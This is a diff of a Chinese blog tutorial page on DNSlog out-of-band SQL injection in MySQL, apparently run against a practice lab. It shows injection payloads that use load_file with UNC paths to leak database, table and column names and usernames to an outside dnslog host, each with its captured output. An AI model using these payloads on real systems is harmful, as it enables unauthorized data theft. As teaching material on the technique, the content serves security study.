@@ -601,41 +601,51 @@ information_schema.t93eb2.dnslog.cn    123.150.10.10    2021-03-07 18:41:43
 -- 通过修改limit参数可遍历出所有数据库名称</code></pre>
 </li>
 <li><p>接着，在<strong>information_schema</strong>的一个名为<strong>tables</strong>的数据表中存着全部的<strong>数据表信息</strong>。其中，<strong>table_name 字段保存其名称</strong>，<strong>table_schema保存其对应的数据库名</strong>。</p>
-<p>```mysql</p>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p>当前数据库表名<br> select id,username,password from users where id = 1 and if(load_file(concat(‘\\\\’,(select table_name from information_schema.tables where table_schema=database() limit 0,1),’.t93eb2.dnslog.cn/zzz’)),1,0) – + </p>
-<p> – 输出<br> emails.t93eb2.dnslog.cn    123.150.10.10    2021-03-07 18:46:42</p>
-<p> – 指定数据库表名<br> select id,username,password from users where id = 1 and if(load_file(concat(‘\\\\’,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),’.t93eb2.dnslog.cn/zzz’)),1,0) – +<br> – 输出<br> emails.t93eb2.dnslog.cn    221.239.30.37    2021-03-07 18:46:42<br> ```</p>
-<ul>
-<li><p>其次，通过其表名，查询该表的所有字段名（列名）。通过<strong>information_schema</strong>库下的<strong>columns</strong>表可查询对应的数据库/数据库表含有的字段名。</p>
-<p>```mysql</p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><p>当前数据库中的users表<br> select id,username,password from users where id = 1 and if(load_file(concat(‘\\\\’,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 0,1),’.t93eb2.dnslog.cn/zzz’)),1,0) – +<br>#此处的表名为字符串型，也通过十六进制表示<br> – 输出<br>id.t93eb2.dnslog.cn    221.239.30.45    2021-03-07 18:51:16</p>
-<p> – security数据库中的user表<br> select id,username,password from users where id = 1 and if(load_file(concat(‘\\\\’,(select column_name from information_schema.columns where table_schema=’security’ and table_name=’users’ limit 0,1),’.t93eb2.dnslog.cn/zzz’)),1,0) – +<br> – 输出<br> id.t93eb2.dnslog.cn    221.239.30.45    2021-03-07 18:51:16</p>
-<pre><code>
-- 知道了想要的数据存放的数据库、数据表、字段名，直接联合查询即可。
-
- ```mysql
- -- 查询security数据库的users表中指定字段值
- select id,username,password from users where id = 1 and if(load_file(concat(&#39;\\\\&#39;,(select username from security.users limit 0,1),&#39;.t93eb2.dnslog.cn/zzz&#39;)),1,0) -- + 
-
- -- 输出
-Dumb.t93eb2.dnslog.cn    123.150.10.14    2021-03-07 18:51:49</code></pre><p>简单的说，<strong>查库名→查表名→查字段名→查数据</strong></p>
 </li>
 </ul>
 </li>
 </ul>
 </li>
 </ol>
-<h1 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h1><h2 id="演示环境"><a href="#演示环境" class="headerlink" title="演示环境"></a>演示环境</h2><ul>
+<pre><code>   ```mysql
+  -- 当前数据库表名
+   select id,username,password from users where id = 1 and if(load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#39;.t93eb2.dnslog.cn/zzz&#39;)),1,0) -- + 
+
+   -- 输出 
+   emails.t93eb2.dnslog.cn    123.150.10.10    2021-03-07 18:46:42
+
+   -- 指定数据库表名
+   select id,username,password from users where id = 1 and if(load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),&#39;.t93eb2.dnslog.cn/zzz&#39;)),1,0) -- + 
+   -- 输出
+   emails.t93eb2.dnslog.cn    221.239.30.37    2021-03-07 18:46:42
+   ```
+
+ - 其次，通过其表名，查询该表的所有字段名（列名）。通过**information_schema**库下的**columns**表可查询对应的数据库/数据库表含有的字段名。
+
+   ```mysql
+-- 当前数据库中的users表
+   select id,username,password from users where id = 1 and if(load_file(concat(&#39;\\\\&#39;,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1),&#39;.t93eb2.dnslog.cn/zzz&#39;)),1,0) -- + 
+#此处的表名为字符串型，也通过十六进制表示
+   -- 输出
+ id.t93eb2.dnslog.cn    221.239.30.45    2021-03-07 18:51:16
+
+   -- security数据库中的user表
+   select id,username,password from users where id = 1 and if(load_file(concat(&#39;\\\\&#39;,(select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),&#39;.t93eb2.dnslog.cn/zzz&#39;)),1,0) -- + 
+   -- 输出
+   id.t93eb2.dnslog.cn    221.239.30.45    2021-03-07 18:51:16
+   ```
+
+ - 知道了想要的数据存放的数据库、数据表、字段名，直接联合查询即可。
+
+   ```mysql
+  -- 查询security数据库的users表中指定字段值
+   select id,username,password from users where id = 1 and if(load_file(concat(&#39;\\\\&#39;,(select username from security.users limit 0,1),&#39;.t93eb2.dnslog.cn/zzz&#39;)),1,0) -- + 
+
+   -- 输出
+ Dumb.t93eb2.dnslog.cn    123.150.10.14    2021-03-07 18:51:49
+   ```
+
+  简单的说，**查库名→查表名→查字段名→查数据**</code></pre><h1 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h1><h2 id="演示环境"><a href="#演示环境" class="headerlink" title="演示环境"></a>演示环境</h2><ul>
 <li>服务器系统：<code>Windows Server 2008 R2</code></li>
 <li>脚本：<code>php-5.2.17nts</code></li>
 <li>中间件：<code>Apache-2.4.29</code></li>
@@ -1541,10 +1551,10 @@ $(function () {
     
 
     
-    <script src="/libs/instantpage/instantpage.js" type="module"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/assets/hibiki.model.json"},"display":{"position":"left","width":200,"height":410},"mobile":{"show":false},"react":{"opacity":0.7}});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/assets/hibiki.model.json"},"display":{"position":"left","width":200,"height":410},"mobile":{"show":false},"react":{"opacity":0.7}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
 
 </html>
 <script type="text/javascript" src="/js/click_show_text.js"></script>
